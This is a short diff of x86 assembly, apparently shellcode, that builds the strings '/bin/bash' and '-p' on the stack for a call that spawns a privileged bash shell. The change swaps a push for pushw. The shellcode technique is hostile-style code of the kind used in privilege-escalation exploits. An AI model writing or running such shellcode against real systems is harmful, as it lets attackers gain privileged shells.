@@ -91,7 +91,7 @@ _start:
 	mov %esp, %ebx # /bin/bash
 
 	push %edx
-	push $0x702d 
+	pushw $0x702d 
 	mov %esp, %ecx # -p
 
 	push %edx
